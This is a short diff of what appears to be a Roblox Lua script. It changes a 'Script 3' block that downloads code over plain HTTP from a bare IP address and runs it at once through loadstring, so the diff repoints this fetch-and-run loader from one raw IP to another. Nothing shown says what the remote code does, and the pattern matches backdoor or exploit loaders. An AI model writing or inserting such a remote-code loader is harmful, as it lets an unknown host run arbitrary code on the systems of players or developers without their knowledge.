@@ -19,5 +19,5 @@ end)
 
 -- Script 3
 task.spawn(function()
-    loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
+    loadstring(game:HttpGet("http://31.172.87.116/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
 end)
